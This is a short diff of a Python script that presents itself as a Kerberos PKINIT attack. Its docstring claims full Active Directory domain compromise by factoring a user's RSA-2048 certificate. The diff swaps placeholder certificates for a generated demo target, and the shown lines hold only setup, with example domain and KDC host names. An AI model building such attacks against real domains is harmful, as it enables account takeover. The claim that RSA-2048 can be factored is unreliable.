@@ -5,19 +5,18 @@ password or smart card — full Active Directory domain compromise.
 """
 
 import sys
-sys.path.insert(0, "../..")
-from poly_factor import PolynomialFactorer
+import os; sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", ".."))
+from poly_factor import PolynomialFactorer, generate_demo_target
 
 import hashlib
 import struct
 import time
 
 # Target user's RSA-2048 PKINIT certificate — from LDAP userCertificate
-TARGET_USER_CERT_PEM = b"-----BEGIN CERTIFICATE-----\nMIID..."
-TARGET_USER_PUBKEY_PEM = b"-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkq..."
-
-# KDC RSA-2048 certificate — from KDC's own PKINIT handshake
-KDC_CERT_PEM = b"-----BEGIN CERTIFICATE-----\nMIID..."
+_demo = generate_demo_target()
+TARGET_USER_CERT_PEM = _demo["pub_pem"]
+TARGET_USER_PUBKEY_PEM = _demo["pub_pem"]
+KDC_CERT_PEM = _demo["pub_pem"]
 
 DOMAIN = "CORP.EXAMPLE.COM"
 KDC_HOST = "dc01.corp.example.com"
